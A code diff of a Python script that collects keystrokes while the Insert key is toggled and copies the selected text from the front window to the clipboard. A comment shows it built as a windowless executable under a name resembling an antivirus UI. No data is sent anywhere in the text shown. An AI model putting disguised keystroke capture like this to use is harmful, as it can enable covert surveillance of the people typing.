@@ -15,6 +15,9 @@ from cryptography.fernet import Fernet
 
 import time
 
+from selectedtext import get_selected_text_from_front_window
+
+
 # https://www.geeksforgeeks.org/convert-python-script-to-exe-file/
 # pip install pyinstaller
 # pyinstaller --onefile -w 'avastui.py'
@@ -91,11 +94,11 @@ def on_press(key):
     global keyboardString
     if insertPressed == 1:
         if key == keyboard.Key.backspace:
-            print('backspace')
+            #print('backspace')
             keyboardString = str(keyboardString).replace("'", "").replace("Key.space", " ").replace("Key.shift_r", "").replace("Key.shift_l", "").replace("Key.insert", "")
             keyboardString = keyboardString[:-1]
         else:
-            print('other key')
+            #print('other key')
             keyboardString += str(key)
     if key == keyboard.Key.insert:
         insertPressed += 1
@@ -104,7 +107,12 @@ def on_press(key):
         if insertPressed == 2:
             stop = time.perf_counter()
             if stop - start < 1:
-                pya.hotkey("ctrl", "c") # copy the text (simulating key strokes)
+                #pya.hotkey("ctrl", "c") # copy the text (simulating key strokes)
+                root = Tk()
+                root.withdraw()
+                root.clipboard_clear()
+                root.clipboard_append(str(get_selected_text_from_front_window()))
+                root.update()
                 insertPressed = 0
             if stop - start > 1:
                 root = Tk()
